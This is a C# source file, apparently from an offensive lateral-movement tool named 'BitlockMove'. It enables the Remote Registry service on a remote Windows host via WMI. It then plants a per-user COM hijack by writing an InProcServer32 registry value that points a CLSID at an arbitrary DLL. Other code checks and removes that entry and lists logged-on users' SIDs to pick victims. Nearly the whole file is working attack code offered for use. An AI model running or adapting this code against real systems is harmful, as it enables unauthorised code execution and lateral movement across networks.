using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Security.Principal;


namespace BitlockMove
{
  
    static class RemoteRegistry
    {
        static void EnableRemoteRegistryViaWMI(string computerName, string username = null, string password = null)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions();
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    options.Username = username;
                    options.Password = password;
                }

                ManagementScope scope = new ManagementScope(
                    $"\\\\{computerName}\\root\\cimv2", options);
                scope.Connect();

                // Get the RemoteRegistry service
                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Service WHERE Name='RemoteRegistry'");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);

                foreach (ManagementObject service in searcher.Get())
                {
                    // Change startup type to Automatic
                    ManagementBaseObject inParams = service.GetMethodParameters("ChangeStartMode");
                    inParams["StartMode"] = "Automatic";
                    service.InvokeMethod("ChangeStartMode", inParams, null);

                    // Start the service
                    service.InvokeMethod("StartService", null);

                    Console.WriteLine("[+] Remote Registry service enabled and started successfully!");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        public static void DisableRemoteRegistryViaWMI(string computerName, string username = null, string password = null)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions();
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    options.Username = username;
                    options.Password = password;
                }

                ManagementScope scope = new ManagementScope(
                    $"\\\\{computerName}\\root\\cimv2", options);
                scope.Connect();

                // Get the RemoteRegistry service
                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Service WHERE Name='RemoteRegistry'");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);

                foreach (ManagementObject service in searcher.Get())
                {
                    // Stop the service
                    service.InvokeMethod("StopService", null);
                    Console.WriteLine("[+] Remote Registry service stopped successfully!");

                    // Change the startup type to Disabled
                    ManagementBaseObject inParams = service.GetMethodParameters("ChangeStartMode");
                    inParams["StartMode"] = "Disabled";
                    service.InvokeMethod("ChangeStartMode", inParams, null);

                    Console.WriteLine("[+] Remote Registry service disabled successfully!");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
            }
        }

        public static bool VerifyRegistryEntry(string computerName, string username, string expectedDllPath)
        {
            try
            {
                // Resolve username to SID
                NTAccount userAccount = new NTAccount(username);
                SecurityIdentifier userSid = (SecurityIdentifier)userAccount.Translate(typeof(SecurityIdentifier));
                string sidString = userSid.ToString();

                // Construct the registry path
                string registryPath = $@"{sidString}\SOFTWARE\Classes\CLSID\{{A7A63E5C-3877-4840-8727-C1EA9D7A4D50}}\InProcServer32";

                // Open the remote registry key
                using (RegistryKey remoteBaseKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, computerName))
                {
                    // Try to open the specific registry key
                    using (RegistryKey inProcKey = remoteBaseKey.OpenSubKey(registryPath))
                    {
                        if (inProcKey == null)
                        {
                            return false; // Key doesn't exist
                        }

                        // Get the default value and compare
                        string currentDllPath = inProcKey.GetValue("")?.ToString();
                        return !string.IsNullOrEmpty(currentDllPath) &&
                                currentDllPath.Equals(expectedDllPath, StringComparison.OrdinalIgnoreCase);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error verifying registry entry: {ex.Message}");
                return false;
            }
        }
        public static bool WriteRegistryEntryForUser(string computerName, string username, string dllPath)
        {
            try
            {
                EnableRemoteRegistryViaWMI(computerName);
            }
            catch
            {
                Console.WriteLine("[-] Enabling remote registry failed.");
            }
            try
            {
                // Attempt to resolve the username to a SID
                NTAccount userAccount = new NTAccount(username);
                SecurityIdentifier userSid = (SecurityIdentifier)userAccount.Translate(typeof(SecurityIdentifier));
                string sidString = userSid.ToString();

                string registryPath = $@"{sidString}\SOFTWARE\Classes\CLSID\{{A7A63E5C-3877-4840-8727-C1EA9D7A4D50}}";

                // Open the remote registry key
                using (RegistryKey remoteBaseKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, computerName))
                {
                    // Ensure the CLSID key exists
                    using (RegistryKey clsidKey = remoteBaseKey.CreateSubKey(registryPath))
                    {
                        // Create or open the InProcServer32 subkey
                        using (RegistryKey inProcKey = clsidKey.CreateSubKey("InProcServer32"))
                        {
                            // Set the default value to the provided DLL path
                            inProcKey.SetValue("", dllPath);
                        }
                    }
                }

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error writing registry entry: {ex.Message}");
                return false;
            }
        }

        public static bool DeleteRegistryEntry(string computerName, string username)
        {
            try
            {
                // Resolve username to SID
                NTAccount userAccount = new NTAccount(username);
                SecurityIdentifier userSid = (SecurityIdentifier)userAccount.Translate(typeof(SecurityIdentifier));
                string sidString = userSid.ToString();

                // Construct the base registry path
                string baseRegistryPath = $@"{sidString}\SOFTWARE\Classes\CLSID\{{A7A63E5C-3877-4840-8727-C1EA9D7A4D50}}";

                // Open the remote registry key
                using (RegistryKey remoteBaseKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, computerName))
                {
                    // First, try to delete the InProcServer32 subkey
                    try
                    {
                        remoteBaseKey.OpenSubKey(baseRegistryPath, true)?.DeleteSubKey("InProcServer32", false);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Error deleting InProcServer32 subkey: {ex.Message}");
                    }

                    // Then attempt to delete the entire CLSID entry
                    try
                    {
                        remoteBaseKey.OpenSubKey($@"{sidString}\SOFTWARE\Classes\CLSID", true)
                            ?.DeleteSubKey("{{A7A63E5C-3877-4840-8727-C1EA9D7A4D50}}", false);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Error deleting CLSID entry: {ex.Message}");
                        return false;
                    }
                }

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error deleting registry entry: {ex.Message}");
                return false;
            }
        }
        
        static List<string> getUsers(string computerName)
        {
            int timeout = 5000; // Timeout in milliseconds
            List<string> results = new List<string>();
            RegistryKey remoteRegistry = null;
            string[] subKeyNames = new string[0];
            try
            {
                remoteRegistry = RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, computerName);
            }
            catch
            {
                Console.WriteLine("[-] Failed to query HKEY_USERS");
            }
            try
            {
                subKeyNames = remoteRegistry.GetSubKeyNames(); // Get all the subkey names (user SIDs)
            }
            catch
            {
                Console.WriteLine("[-] Failed to query user subkeys");
            }
            try
            {
                // Open remote base key in HKEY_USERS for the remote computer

                List<string> userSIDs = new List<string>();

                // Loop through all the keys and filter for valid SIDs
                foreach (var key in subKeyNames)
                {
                    if (IsValidSid(key))
                    {
                        userSIDs.Add(key);
                        results.Add(key);
                    }
                }

                // Resolve SIDs to user accounts
                foreach (var sid in userSIDs)
                {
                    try
                    {
                        SecurityIdentifier userSid = new SecurityIdentifier(sid);
                        NTAccount userAccount = (NTAccount)userSid.Translate(typeof(NTAccount));
                        string[] splitEntry = userAccount.Value.Split('\\');

                        // Apply custom filters (skip entries as per your conditions)
                        if (splitEntry.Length == 2)
                        {
                            string domain = splitEntry[0];
                            string username = splitEntry[1];

                            // Customize this condition to meet your filtering needs
                            if (!domain.Contains(" ") && !username.Contains(computerName))
                            {
                                results.Add($"Domain: {domain}, User: {username}");
                            }
                        }
                    }
                    catch
                    {
                        // Handle cases where SID translation fails
                        Console.WriteLine($"Failed to translate SID: {sid}");
                    }
                }

                remoteRegistry.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }

            // Sort and print the results
            var sortedResults = results.Distinct().OrderBy(r => r).ToList();
            /*
            foreach (var result in sortedResults)
            {
                Console.WriteLine(result);
            }*/

            return results;
        }

        // Helper function to validate if a string is a valid SID
        static bool IsValidSid(string key)
        {
            return System.Text.RegularExpressions.Regex.IsMatch(key, @"^S-\d-\d+-(\d+-){1,14}\d+$");
        }

    }
}
